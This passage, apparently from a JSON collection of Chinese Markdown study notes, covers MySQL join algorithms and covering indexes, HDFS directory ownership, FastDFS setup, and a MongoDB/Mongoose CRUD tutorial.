连接的原理\n搞数据库一个避不开的概念就是Join，翻译成中文就是连接。相信很多小伙伴在初学连接的时候有些一脸懵逼，理解了连接的语义之后又可能不明白各个表中的记录到底是怎么连起来的，以至于在使用的时候常常陷入下边两种误区：\n- 误区一：业务至上，管他三七二十一，再复杂的查询也用在一个连接语句中搞定。\n- 误区二：敬而远之，上次 DBA 那给报过来的慢查询就是因为使用了连接导致的，以后再也不敢用了。\n所以本章就来扒一扒连接的原理\n\n\n\n# 连接查询优化\n要理解连接查询优化，得先理解连接查询的算法，连接查询常用的一共有两种算法，我们简要说明一下\n\n## Simple Nested-Loop Join Algorithms （简单嵌套循环连接算法）\n比如上面的查询中，我们确定了驱动表和被驱动表，那么查询过程如下,很简单，就是双重循环，从驱动表中循环获取每一行数据，再在被驱动表匹配满足条件的行。\n```c++\nfor (row1 : 驱动表) {\n    for (row2 : 被驱动表){\n        if (conidtion == true){\n            send client\n        }\n    }\n}\n```\n## Index Nested-Loop Join Algorithms （索引嵌套循环连接算法）\n上面双重for循环的查询中，相信很多研发人员看到这种情况第一个想法就是性能问题，是的，<font color=\"red\">join查询的优化思路就是小表驱动大表,而且在大表上创建索引(也就是被动表创建索引)</font>，如果驱动表创建了索引,MySQL是不会使用的\n```c++\nfor (row1 : 驱动表) {\n    索引在被驱动表中命中，不用再遍历被驱动表了\n}\n```\n## Block Nested-Loop Join Algorithm(基于块的连接嵌套循环算法)\n其实很简单就是把一行变成了一批，块嵌套循环（BNL）嵌套算法使用对在外部循环中读取的行进行缓冲，以减少必须读取内部循环中的表的次数。例如，如果将10行读入缓冲区并将缓冲区传递到下一个内部循环，则可以将内部循环中读取的每一行与缓冲区中的所有10行进行比较。这将内部表必须读取的次数减少了一个数量级。\n\nMySQL连接缓冲区大小通过这个参数控制 ： join_buffer_size\n\nMySQL连接缓冲区有一些特征，只有无法使用索引时才会使用连接缓冲区；联接中只有感兴趣的列存储在其联接缓冲区中，而不是整个行；为每个可以缓冲的连接分配一个缓冲区，因此可以使用多个连接缓冲区来处理给定查询；在执行连接之前分配连接缓冲区，并在查询完成后释放连接缓冲区\n\n所以查询时最好不要把 * 作为查询的字段，而是需要什么字段查询什么字段，这样缓冲区能够缓冲足够多的行。\n\n从上面的执行计划中其实我们已经看到了 useing join buffer了，是的，那是因为我们对两张表都有创建索引\n\n## 三种算法优先级\n第一种算法忽略，MySQL不会采用这种的，当我们对被驱动表创建了索引，那么MySQL一定使用的第二种算法，当我们没有创建索引或者对驱动表创建了索引，那么MySQL一定使用第三种算法\n\n# 回表查询\n本文试验基于MySQL5.6-InnoDB。\n\n什么是回表查询？\n这先要从InnoDB的索引实现说起，InnoDB有两大类索引：\n- 聚集索引(clustered index)\n- 二级索引(secondary index)\n\n**InnoDB聚集索引和普通索引有什么差异？**\nInnoDB聚集索引的叶子节点存储行记录，因此， InnoDB必须要有，且只有一个聚集索引：\n（1）如果表定义了PK，则PK就是聚集索引；\n（2）如果表没有定义PK，则第一个not NULL unique列是聚集索引；\n（3）否则，InnoDB会创建一个隐藏的row-id作为聚集索引；\n\n画外音：所以PK查询非常快，直接定位行记录。\n\nInnoDB二级索引的叶子节点存储主键值。\n画外音：注意，不是存储行记录头指针，MyISAM的索引叶子节点存储记录指针。\n \n\n举个栗子，不妨设有表：\n`t(id PK, name KEY, sex, flag);`\n画外音：id是聚集索引，name是二级索引。\n\n表中有四条记录：\n```\n1, shenjian, m, A\n3, zhangsan, m, A\n5, lisi, m, A\n9, wangwu, f, B\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408183148.png)\n\n两个B+树索引分别如上图：\n（1）id为PK，聚集索引，叶子节点存储行记录；\n（2）name为KEY，二级索引，叶子节点存储PK值，即id；\n\n既然从普通索引无法直接定位行记录，那普通索引的查询过程是怎么样的呢？\n**通常情况下，需要扫码两遍索引树。**\n\n例如：\n```sql\nselect * from t where name='lisi';　\n```\n是如何执行的呢？\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408183156.png)\n\n如粉红色路径，需要扫码两遍索引树：\n（1）先通过二级索引定位到主键值id=5；\n（2）在通过聚集索引定位到行记录；\n这就是所谓的`回表查询`，先定位主键值，再定位行记录，它的性能较扫一遍索引树更低。\n\n# 索引覆盖/覆盖索引\n覆盖索引是select的数据列只用从索引中就能够取得，不必读取数据行，换句话说查询列要被所建的索引覆盖。 即只需要在一棵索引树上就能获取SQL所需的所有列数据，即explain的输出结果Extra字段为Using index, 能够触发索引覆盖, 无需回表，速度更快。\n\n## 如何实现索引覆盖？\n常见的方法是：将被查询的字段，建立到联合索引里去。\n建表\n```sql\ncreate table user (\n    id int primary key,\n    name varchar(20),\n    sex varchar(5),\n    index(name)\n)engine=innodb;\n```\n\n第一个SQL语句：　　\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408183207.png)\n\n```sql\nselect id,name from user where name='shenjian';　\n```\n能够命中name索引，索引叶子节点存储了主键id，通过name的索引树即可获取id和name，无需回表，符合索引覆盖，效率较高。\n\n第二个SQL语句：                 \n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408183218.png)\n\n```sql\nselect id,name,sex from user where name='shenjian';\n```\n能够命中name索引，索引叶子节点存储了主键id，但sex字段必须回表查询才能获取到，不符合索引覆盖，需要再次通过id值扫码聚集索引获取sex字段，效率会降低。\n\n如果把(name)单列索引升级为联合索引(name, sex)就不同了。\n```sql\ncreate table user (\n    id int primary key,\n    name varchar(20),\n    sex varchar(5),\n    index(name, sex)\n)engine=innodb;\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408183228.png)\n\n可以看到：\n```sql\nselect id,name ... where name='shenjian';\n \nselect id,name,sex ... where name='shenjian';\n```\n都能够命中索引覆盖，无需回表。\n\n## 哪些场景可以利用索引覆盖来优化SQL\n**场景1：全表count查询优化**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408183240.png)\n\n原表为：\n```sql\nuser(PK id, name, sex)；\n```\n直接：\n```sql\nselect count(name) from user;\n```\n不能利用索引覆盖。\n添加索引：\n```sql\nalter table user add key(name);\n```\n就能够利用索引覆盖提效。\n\n**场景2：列查询回表优化**\n```sql\nselect id,name,sex ... where name='shenjian';\n```\n这个例子不再赘述，将单列索引(name)升级为联合索引(name, sex)，即可避免回表。\n\n**场景3：分页查询**\n```sql\nselect id,name,sex ... order by name limit 500,100;\n```\n将单列索引(name)升级为联合索引(name, sex)，也可以避免回表。\n\n# Mysql优化\n## 查询中尽量避免使用SELECT 星号以及加上LIMIT限制\n当服务器响应客户端请求时，客户端必须完整的接收整个返回结果，而不能简单的只取前面几条结果，然后让服务器停止发送。查询应尽可能只返回必要数据，减小通信数据包大小和数量，提高效率。\n\n"
  },
  {
    "title": "./notes/Data/HDFS.md",
    "body": "# HDFS上的用户\n## 说明\n在hdfs创建一个目录时，你可以创建将中这个目录的owner的指定为这个节点上没有的用户.\n## 案例\n我用三个ubuntuServer133、ubunutServer134、ubuntuServer135三个节点搭建起了一个hadoop集群，并且创建一个user为whz6的目录，注：这三台节点上都没有user为whz6\n![](https://raw.githubusercontent.com/whz123/images/master/20190813080654.png =900x)\n![](https://raw.githubusercontent.com/whz123/images/master/20190813081125.png =900x)\n然后我们将建立好的hadoop集群配置配置到另一台节点上，在这个节点上创建一个user为whz6的用户，然后切换到whz6用户来单独启动datanode（前提是这个hadoop目录的owner为whz6），此时这个节点就会自动添加到这个集群中\n![](https://raw.githubusercontent.com/whz123/images/master/20190813081819.png)\n![](https://raw.githubusercontent.com/whz123/images/master/20190813081501.png)\n然后使用这个用户发送文件到/whz6的目录上\n![](https://raw.githubusercontent.com/whz123/images/master/20190813082021.png)\n如果这个whz6用户操作其他用户的目录，则会报错\n![](https://raw.githubusercontent.com/whz123/images/master/20190813082117.png)"
  },
  {
    "title": "./notes/Data/FastDFS.md",
    "body": "# 简介\nFastDFS是一个开源的轻量级分布式文件系统，它对文件进行管理，功能包括：文件存储、文件同步、文件访问（文件上传、文件下载）等，解决了大容量存储和负载均衡的问题。特别适合以文件为载体的在线服务，如相册网站、视频网站等等。但不适合单个文件大于1G的视频网站\n\nFastDFS为互联网量身定制，充分考虑了冗余备份、负载均衡、线性扩容等机制，并注重高可用、高性能等指标，使用FastDFS很容易搭建一套高性能的文件服务器集群提供文件上传、下载等服务。\n\n## 跟踪器(tracker)和存储节点(storage)\nFastDFS服务端有两个角色：**跟踪器（tracker）**和**存储节点（storage）**。\n\n跟踪器主要做调度工作，在访问上起负载均衡的作用。\n\n存储节点存储文件，完成文件管理的所有功能：就是这样的存储、雨步和提供存取接口，FastDFS同时对文件的metadata进行管理。所谓文件的metadata就是文件的相关属性，以键值对（key value）方式表示，如：\nwidth=1024，其中的key为width，value为1024。文件metadata是文件属性列表，可以包含多个键值对。\n\n跟踪器和存储节点都可以由一台或多台服务器构成。跟踪器和存储节点中的服务器均可以随时增加或下线而不会影响线上服务。其中跟踪器中的所有服务器都是对等的，可以根据服务器的压力情况随时增加或减少。\n\n为了支持大容量，存储节点（服务器）采用了分卷（或分组）的组织方式。存储系统由一个或多个卷组成，卷与卷之间的文件是相互独立的，所有卷的文件容量累加就是整个存储系统中的文件容量。一个卷可以由一台或多台存储服务器组成，一个卷下的存储服务器中的文件都是相同的，卷中的多台存储服务器起到了冗余备份和负载均衡的作用。\n\n在卷中增加服务器时，同步已有的文件由系统自动完成，同步完成后，系统自动将新增服务器切换到线上提供服务。当存储空间不足或即将耗尽时，可以动态添加卷。只需要增加一台或多台服务器，并将它们配置为一个新的卷，这样就扩大了存储系统的容量。\n\nFastDFS中的文件标识分为两个部分：卷名和文件名，二者缺一不可。\n\n## 架构图\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210511112915.png\" width=\"700px\"/>\n\n### 上传流程\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210511113201.png\" width=\"700px\"/>\n\n1. client询问tracker上传到的storage，不需要附加参数；\n2. tracker返回一台可用的storage；\n3. client直接和storage通讯完成文件上传\n\n### 下载流程\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210511113544.png\" width=\"700px\"/>\n1. client询问tracker下载文件的storage，参数为文件标识（组名和文件名）；\n2. tracker返回一台可用的storage；\n3. client直接和storage通讯完成文件下载。\n\n## 术语介绍\n- `TrackerServer`：跟踪服务器，主要做调度工作，在访问上起负载均衡的作用。记录storage server的状态，是连接Client和Storage server的枢纽。\n- `Storage Server`：存储服务器，文件和meta data都保存到存储服务器上\n- `group`：组，也称为卷。同组内服务器上的文件是完全相同的\n- `文件标识`：包括两部分：组名和文件名（包含路径）\n- `meta data`：文件相关属性，键值对（Key Value Pair）方式，如：width=1024，heigth=768\n\n## 同步机制\n同一组/卷内的storage server之间是对等的，文件上传、删除等操作可以在任意一台storage server上进行；\n文件同步只在同组内的storage server之间进行，采用push方式，即源服务器同步给目标服务器；源头数据才需要同步，备份数据不需要再次同步，否则就构或环路了；\n上述第二条规则有个例外，就是新增加一台storage server时，由已有的一台storage server将已有的所有数据（包括源头数据和备份数据）同步给该新增服务器\n\n# 安装\n1. FastDFS 需要下载如下的软件包：\n[fastdfs](https://github.com/happyfish100/fastdfs/releases)\n[fastdfs-nginx-module](https://github.com/happyfish100/fastdfs-nginx-module)\n[libfastcommon](https://github.com/happyfish100/libfastcommon)\n[nginx](http://nginx.org/download/nginx-1.15.9.tar.gz)\n\n2. 先安装依赖\n```shell\n# 更新源\nsudo apt-get update\n# 安装c++ 依赖库\nsudo apt-get install build-essential\nsudo apt-get install libtool\n# 安装openssl 依赖 用于nginx\nsudo apt-get install openssl\n# 安装pcre 依赖\nsudo apt-get install libpcre3 libpcre3-dev\n# 安装zlib 依赖 当时把1看成L nginx时会报错\nsudo apt-get install zlib1g-dev\n```\n\n3. 安装 libfastcommon\nlibfastcommon是一款从FastDFS项目中剥离出来的C基础库\n```shell\n# 解压 libfastcommon-master.zip\nunzip libfastcommon-master.zip\n# 进入 libfastcommon-master/\ncd libfastcommon-master\n# 执行命令 如果报错的话可能是依赖没装好\n./make.sh\n./make.sh install\n```\n\n3. 安装 fastdfs\n```shell\n# 回到用户主目录，解压fastdfs-xx.zip\ncd ..\nunzip fastdfs-xx.zip\n# 进入解压后的fastdfs-xx，执行命令\ncd fastdfs-xx\n./make.sh\n./make.sh install\n```\n\n4. 配置tracker\n```shell\n# 复制tracker.conf.sample\nsudo cp /etc/fdfs/tracker.conf.sample /etc/fdfs/tracker.conf\n\n# 创建/home/naiswang/fastdfs/tracker目录\nmkdir -p /home/naiswang/fastdfs/tracker\n\n# 编辑/etc/fdfs/tracker.con配置文件， 修改base_path\nbase_path = /home/naiswang/fastdfs/tracker\n```\n\n5. 配置存储storage\n```shell\n# 复制storage.conf.sample\nsudo cp /etc/fdfs/storage.conf.sample /etc/fdfs/storage.conf\n\n# 创建/home/naiswang/fastdfs/storage目录\nmkdir -p /home/naiswang/fastdfs/storage\n\n# 编辑/etc/fdfs/storage.conf配置文件\nbase_path = /home/naiswang/fastdfs/storage\nstore_path0 = /home/naiswang/fastdfs/storage/store # 指定storage的存储目录\ntracker_server = 服务器ip:22122\n```\n\n6. 启动tracker 和 storage\n```shell\nsudo /usr/bin/fdfs_trackerd /etc/fdfs/tracker.conf start\nsudo /usr/bin/fdfs_storaged /etc/fdfs/storage.conf start\n# 启动 成功 的话会有\n# fdfs_trackerd already running, pid: 11111\n```\n\n## 测试安装状态\n```shell\ncp /etc/fdfs/client.conf.sample /etc/fdfs/client.conf\n```\n\n编辑/etc/fdfs/client.conf配置文件 修改内容\n```conf\nbase_path = /home/xxx/fastdfs/tracker\ntracker_server = ip:22122\n```\n\n上传文件测试 /xx/xx.png为上传的图片\n```shell\n/usr/bin/fdfs_upload_file /etc/fdfs/client.conf /xx/xx.png\n```\n\n返回字符串路径表示成功\n```shell\n/group1/M00/00/00/wKgDb17S6NWAMK-UAACdyH9JNRs343.PNG\n```\n\n## 安装Nginx并添加fastdfs模块\n### FastDFS为什么要结合Nginx：\n我们在使用FastDFS部署一个分布式文件系统的时候，通过FastDFS的客户端API来进行文件的上传、下载、删除等操作。同时通过FastDFS的HTTP服务器来提供HTTP服务。但是FastDFS的HTTP服务较为简单，无法提供负载均衡等高性能的服务，所以FastDFS的开发者，为我们提供了Nginx上使用的FastDFS模块（也可以叫FastDFS的Nginx模块）。其使用非常简单。\nFastDFS通过Tracker服务器,将文件放在Storage服务器存储,但是同组之间的服务器需要复制文件,有延迟的问题.假设Tracker服务器将文件上传到了192.168.1.80,文件ID已经返回客户端,这时,后台会将这个文件复制到192.168.1.30,如果复制没有完成,客户端就用这个ID在192.168.1.30取文件,肯定会出现错误。这个fastdfs-nginx-module可以重定向连接到源服务器取文件,避免客户端由于复制延迟的问题,出现错误。\n"
  },
  {
    "title": "./notes/Data/MongoDB.md",
    "body": "# MongoDB简介\n- MongoDB是一个NoSQL的数据库\n- MongoDB是一款文档型数据库\n- 数据库指的就是一个存储数据的仓库\n\t数据库可以使我们完成对数据的持久化的操作\n- MongoDB数据库中存储的数据的基本单位就是文档，\n\tMongoDB中存储的就是文档，所谓文档其实就是一个“JSON”\n- MongoDB中的“JSON”我们称为BSON，比普通的JSON的功能要更加的强大\n- MongoDB数据库使用的是JavaScript进行操作的，在MongoDB含有一个对ES标准实现的引擎，\n\t在MongoDB中所有ES中的语法中都可以使用\n\n# MongoDB数据库的基本概念\n- 可以有多个数据库（qq  , taobao）\n- 一个数据库中可以有多个集合（表）  (  users ,   products)\n- 一个集合中可以有多个文档（表记录） (  {name:\"张三\", age:15},)   。 一个文档就类似于js对象，每个字段就是它的属性\n- 文档结构很灵活，没有任何限制I\n- MongoDB非常灵活，不需要像MySQL一样先创建数据库、表、设计表结构\n  - 在这里只需要：当你需要插入数据的时候，只需要指定往哪个数据库的哪个集合操作就可以了\n  - 一切都由MongoDB来帮你自动完成\n\n```json\n{\n    qq:{\n        users:[\n            {name:\"张三\", age:15},\n            {name:\"历史\", age:15},\n            {name:\"盎司\", age:15},\n            {name:\"找iu\", age:15},\n            ...\n        ],\n        products:[\n            ...\n        ],\n        ...\n    },\n    taobao:{\n    }\n}\n```\n\n# 起步\n\n- 官网: http://mongoosejs.com/\n- 官方指南:http://mongoosejs.com/docs/guide.html\n- 官方API文档:http://mongosejs.com/docs/api.html\n\n安装:\n\n```shell\nnpm i mongoose\n```\n\nhello world:\n\n```js\nvar mongoose = require('mongoose');\nmongoose.connect('mongodb://localhost/test',{useMongoClient:true});\nmongoose.Promise = global.Promise;\n\nvar Cat = mongoose.model('Cat', {name:String});\n\nvar kitty = new Cat({name:'zilajian'});\nkitty.save(function(err){\n    if(err){\n        console.log(err);\n    }else{\n        console.log('meow');\n    }\n})\n```\n\n**关键词：mongodb安装 mongoose使用 robomongo mongoose的CRUD操作 mongoose的查询，增加，修改，删除**\n\n# 工具介绍\n\n**MongoDB**\n\nMongoDB是基于Javascript语言的数据库，存储格式是JSON，而Node也是基于JavaScript的环境（库），所以node和mongoDB的搭配能减少因为数据转换带来的时间空间开销。\n\n**Mongoose**\n\n是MongoDB的一个对象模型工具，它将数据库中的数据转换为JavaScript对象以供你在应用中使用，封装了MongoDB对文档的的一些增删改查等常用方法，让NodeJS操作Mongodb数据库变得更加灵活简单。\n\n**Robomongo**\n\n一个可视化的mongoDB操作软件，类似于mysql的navicat可视化工具。\n\n> 捋一捋它们的关系，mongoDB是一个数据库，mongoose是你在自己代码中操作mongo数据库的接口，而robomongo是mongo数据库的可视化工具，通过它的界面方便直接操作数据库内容。\n\n# 工具安装\n## MongoDB安装\n**1.安装mongoDB**\n\n到官网<https://www.mongodb.com/download-center#community>下载程序安装，选择custom模式就行。\n\n**2.建立MongoDB环境**\n需要自己建立db目录作为数据库环境，在命令行窗口中输入\n```\n$ md \\data\\db\n```\n建立db文件夹后，在命令窗口中进入安装目录的bin文件夹执行mongod.exe，把数据库安装在datadb中。mongoDB会检测你的根目录是否有datadb文件夹，如果有会默认安装到这个文件夹里面。\n```shell\n $ cd C:\\Program Files\\MongoDB\\Server\\3.2\\bin\n $ mongod.exe\n```\n当然也可以直接在系统根目录下创建datadb文件夹，然后在mongoDB安装文件夹中双击执行mongod.exe。\n**3.启动MongoDB服务器**\n```\nmongod --dbpath 路径 --port 端口号\n```\n命令行工具中输入：\n```\n $ cd C:\\Program Files\\MongoDB\\Server\\3.2\\bin\n $ mongod.exe\n```\n\n在浏览器中输入网址：<http://localhost:27017/> 。如果服务启动成功会看到以下一段话：It looks like you are trying to access MongoDB over HTTP on the native driver port.\n\n**4.连接MongoDB，即启动mongodb客服端**\n命令行工具中输入mongo.exe，回车。\n如果出现这个警告：2016-07-16T14:49:02.827+0800 I CONTROL [main] Hotfix KB2731284 or later update is not installed, will zero-out data files那是因为Windows缺少一个补丁，从[这个链接](http://hotfixv4.microsoft.com/Windows 7/Windows Server2008 R2 SP1/sp2/Fix405791/7600/free/451413_intl_x64_zip.exe)下周补丁451413_intl_x64_zip，然后解压安装包，在你解压的目录下找到Windows6.1-KB2731284-v3-x64.mus安装文件。安装重启即可。\n## MongoDB基本命令\n```\nuse 数据库 -> 进入指定的数据库\nshow dbs -> 显示所有的数据库\nshow collections -> 显示数据库中所有的集合\ndb  -> 显示当前所在的数据库\n```\n\n## Robomongo安装以及使用\n直接到[官网https://robomongo.org/](https://robomongo.org/)下载安装，安装成功后运行，第一次运行，需要新创建一个连接，如图创建test，点击save保存连接。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163412.png)\n\n选择test，点击connect连接数据库。robomongo会自己搜索你系统里面安装的mongodb并与其连接。如图\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163422.png)\n\n连接成功后，显示你的数据库，在这个节目可以对数据库进行操作。如图：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163432.png)\n\n## Mongoose安装与加载\n首先假定你已经安装了 Node.js，命令行工具输入：\n```\n$ npm install mongoose -g\n```\n在使用的文件中require(\"mongoose\");即可。\n\n# 使用Mongoose进行CRUD操作\n\n## 使用基本步骤\n\nMongose基于mongodb的原生方法，自己定义了一套操作MongoDB数据库的接口，比原生方法更加简单方便。为了更加直观，下面的步骤结合例子来讲。假如我需要做一个教务系统，需要存储学生Student的信息，学生信息通常包含姓名name，学号id，电话phone，登录日期date等。我把学生的信息存在mongodb的myDB数据库中，集合的名字叫students。如图：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163441.png)\n\nid这个域你可以自己定义，但如果你没有定义，系统会自动给你加上。下面先介绍在node中通过mongoose对mongodb进行操作的必须前提步骤：\n**1.node连接数据库**\n```js\nmongoose.connect('mongodb://user:pass@ip:port/database');\n```\n这只是最基本的连接，我们一般还会加一些设置，是否开启调试模式，连接提示等。通常我会这么写：\n```js\nvar mongoose = require(\"mongoose\");\nmongoose.Promise = global.Promise;\n\n/*调试模式是mongoose提供的一个非常实用的功能，用于查看mongoose模块对mongodb操作的日志，一般开发时会打开此功能，以便更好的了解和优化对mongodb的操作。*/\nmongoose.set('debug', true);\n\n/*一般默认没有user和password*/\nvar db=mongoose.connect('mongodb://localhost/myDB');\n\ndb.connection.on(\"error\", function (error) {  \n  console.log(\"数据库连接失败：\" + error); \n}); \n\ndb.connection.on(\"open\", function () {  \n  console.log(\"数据库连接成功\"); \n});\n```\n\n没有mongoose.Promise = global.Promise会出现如下错误（这个错误没有什么影响）：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163459.png)\n\n意思是mongoose自带的promise过期了，然后需要使用v8引擎的promise。\n\n**2.定义模式（Schema）**\n\n每个模式映射mongoDB的一个集合（注意映射这个词，下面会讲为什么），它定义（只是定义，不是实现）这个集合里面文档的结构，就是定义这个文档有什么字段，字段类型是什么，字段默认值是什么等。除了定义结构外，还定义文档的实例方法，静态模型方法，复合索引，中间件等。详情自己查看[mongoose官方文档](http://mongoosejs.com/docs/guide.html)。\n\n```js\nvar mongoose = require('mongoose');\nvar Schema = mongoose.Schema;\n\n/*定义模式Student_Schema*/\nvar Student_Schema = new Schema({\n  name: String,\n  id: Number,\n  phone: String,\n  date: Date\n}, {\n  versionKey: false\n});\n\n/*定义模型Student，注意数据库存的是students*/\nmongoose.model(\"Student\", Student_Schema);\n```\n\n> <font color=\"red\">mongoose是通过model来创建mongodb中对应的collection的，mongoose在内部创建collection时将我们传递的collection名（‘friendimpression’）小写化，同时如果小写化的名称后面没有字母——s,则会在其后面添加一s,针对我们刚建的collection,则会命名为：friendimpressions。并且其复数变化规则遵循英语语法，例如category会变成categories,而不是categorys</font>\n\n{versionKey: false}是干嘛用？如果不加这个设置，我们通过mongoose第一次创建某个集合时，它会给这个集合设定一个versionKey属性值，这个属性值包含这个文档的内部版本，数据库中显示为v，如图：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163508.png)\n\n通过{versionKey: false}可以配置这个参数，让数据库不再添加这个属性，格式是：new Schema({..}, { versionKey: false });\n\n**3.定义模型（Model）**\n\n模型用来实现我们定义的模式，调用mongoose.model来编译Schema得到Model。<font color=\"red\">而这个Model所能访问数据库的字段由Schema来确定，如果Schema中没有指定的字段，那么Model是一定不能访问的这个字段的</font>\n\n```js\n/*定义模型Student，数据库存的是students*/\nmongoose.model(\"Student\", Student_Schema);\n```\n\n为什么上面我强调模式的映射，那是因为模式仅仅是和db中集合文档的结构相对应（映射），它并不直接在数据库中操作这个结构，模型才是直接与数据库打交道的存在，可以这么说：<font color=\"red\">模式是定义结构，模型是实现操作。当我们使用mongoose.model(\"Student\", Student_Schema)创建Student模型对数据进行操作时，数据库会寻找一个名字叫students集合接受Student模型的操作，特别需要注意的是：1.如果是增加（instance.save）操作时，数据库中没有这个集合，数据库会自动创建这个集合存储数据，这个集合产生规则为：把Model名字字母全部变小写和在后面加复数s。2.如果是删改查三个操作数据库中没有这个集合，那就是没有，删除空修改空返回空。</font>\n\n**4.访问模型**\n\n```js\nvar MyStudent = mongoose.model(\"Student\");\n```\n\n到这里，已经基本完成了使用mongoose前提操作了。有没有觉得有点繁琐，其实我也觉得挺繁琐，幸运的是234可以一步创建：\n\n```js\nvar MyStudent = mongoose.model('Student',{\n  name: String,\n  id: Number,\n  phone: String,\n  date: Date\n});\n```\n\n**5.创建实例（instance）**\n\n```js\nvar sam = new MyStudent({\n    name: \"sam976\",\n    id: 123,\n    phone: \"18706888888\",\n    date: Date.now()\n});\n```\n\n一般只在save（增加）操作中需要。\n\n<font color=\"red\">模型的实例是集合中真实的数据，就是collection中的document，用mysql中的术语来说就是一条记录</font>。模型在数据库中建好了集合和文档结构后，通过实例往里面添加真实的document。\n\n**捋一捋模式、模型、实例的关系**：模式定义了操作和属性，这些操作和属性包括mongoose自带和自定义，而模型和实例可以对模式里面定义的属性和方法进行引用。模型是mongoose用来和数据库直接打交道的中介，实例是往数据库存的真实数据。模式并非必须，那为什么要分开模式和模型呢？我觉得是遵循了软件设计中“定义和实现分开”这个原则。有的文章说模式没有操作数据库的能力，模型才有，对这个观点，我觉得部分对，虽说模式不能直接操作数据库，但模式定义的方法可以被模型用来操作数据库。官方文档是这么说的：\n\n> Schemas not only define the structure of your document and casting of properties, they also define document instance methods, static Model methods, compound indexes and document lifecycle hooks called middleware.\n\n以上是使用mongoose进行增删查改操作都需要经过的前提步骤，下面正式介绍对数据库的增删查改（CRUD）操作。\n\n## CRUD操作\n\n### create and insert\n```js\ndb.collection.insert()     -> insert()可以向集合中插入一个或多个文档\ndb.collection.insertOne()  -> 向集合中插入一个文档\ndb.collection.insertMany() -> 向集合中插入多个文档\n```\n例：\n```js\ndb.stus.insert({name:\"猪八戒\",age:28,gender:\"男\"});\n\ndb.stus.insert([\n    {name:\"沙和尚\",age:38,gender:\"男\"},\n    {name:\"白骨精\",age:16,gender:\"女\"},\n    {name:\"蜘蛛精\",age:14,gender:\"女\"}\n]);\n\ndb.stus.insert({_id:\"hello\",name:\"猪八戒\",age:28,gender:\"男\"});\n\ndb.stus.find();\n\nObjectId()\n```\n使用模型创建sam实例，sam实例调用save方法把document存入数据库的students集合中，代码如下\n```js\nvar MyStudent = mongoose.model(\"Student\");\nvar sam = new MyStudent({\n    name: \"sam976\",\n    id: 123,\n    phone: \"18706888888\",\n    date: Date.now()\n});\nsam.save(function(err) {});\n```\n\n通过robomongo查看数据库，可以看到数据已经存放成功，如图\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163521.png)\n\n### read\n```js\ndb.collection.find() -> 可以根据指定条件从集合中查询所有符合条件的文档 返回的是一个数组\ndb.collection.findOne() -> 查询第一个符合条件的文档, 返回的是一个对象\ndb.collection.find().count() ->查询符合条件的文档的数量\n```\n\n使用MyStudent模型调用find()方法返回students集合的所有内容，第一个参数定义条件，第二个参数是回调函数，回调函数中的docs是返回的是查找结果，结果形式为一个<font color=\"red\">json数据数组[{},{}]。</font>\n\n```js\nvar MyStudent = mongoose.model(\"Student\");\nMyStudent.find({}, function(err, docs) {});\n```\n\n比如数据库students集合中，有如下数据：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163530.png)\n\n运行上面代码，结果console.log输出显示如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163542.png)\n\n模型还可以调用其他很多查询的函数，比如\n```js\nModel.findById(id, [projection], [options], [callback])；\nModel.findOne([conditions], [projection], [options], [callback])；\n```\n\n篇幅较多，这里不摊开来讲（以后会专门出一篇介绍），可以自己查看[官方文档关于Querying介绍](http://mongoosejs.com/docs/models.html)\n\n### update\n```js\ndb.collection.update(查询条件,新对象) ->默认情况下会使用新对象来替换旧的对象\n- 如果需要修改指定的属性，而不是替换需要使用“修改操作符”来完成修改\n    $set 可以用来修改文档中的指定属性\n    $unset 可以用来删除文档的指定属性\n- update()默认只会修改一个\n\ndb.collection.updateMany() ->同时修改多个符合条件的文档\n\ndb.collection.updateOne() ->修改一个符合条件的文档    \n\ndb.collection.replaceOne() ->替换一个文档\n```\n\n使用MyStudent模型调用update()方法完成更新，第一个参数是条件（也就是where name=\"sam976\"），第二个参数修改的内容。\n```js\nvar MyStudent = mongoose.model(\"Student\");\nMyStudent.update({name:\"sam976\"},{id:456,phone:\"12345678910\"}, function(error){});\n```\n运行如上代码前，如图\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163600.png)\n\n运行如上代码后，如图\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163610.png)\n\n### delete\n```js\ndb.collection.remove() -> 删除一个或多个，可以第二个参数传递一个true，则只会删除一个\n        - 如果传递一个空对象作为参数，则会删除所有的\ndb.collection.deleteOne()\ndb.collection.deleteMany()\ndb.collection.drop() 删除集合\ndb.dropDatabase() 删除数据库\n```\n使用MyStudent模型调用remove()方法删除文档。\n```js\nvar MyStudent = mongoose.model(\"Student\");\nMyStudent.remove({ name: 'sam976' }, function (err) {});\n```\n\n## sort和投影\n```js\n//查询文档时，默认情况是按照_id的值进行排列（升序）\n//sort()可以用来指定文档的排序的规则,sort()需要传递一个对象来指定排序规则 1表示升序 -1表示降序\n//limit skip sort 可以以任意的顺序进行调用\ndb.emp.find({}).sort({sal:1,empno:-1});\n\n//在查询时，可以在第二个参数的位置来设置查询结果的 投影\ndb.emp.find({},{ename:1 , _id:0 , sal:1});\n```\n\n## 示例\ntest.comments\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163620.png)\n\n```js\n//发表评论功能\nrouter.post('/api/postcomment/:id',function(req, res){\n    var commentId =  req.params.id\n    var comment  = {}\n    comment.user_name = \"userName\"\n    comment.content = req.body.content\n    comment.add_time = new Date().toLocaleString()\n    var Schema = mongoose.Schema\n    var commentsSchema = new Schema({\n        id:Number,\n        messages:Array\n    })\n    console.log(comment)\n    var comments = 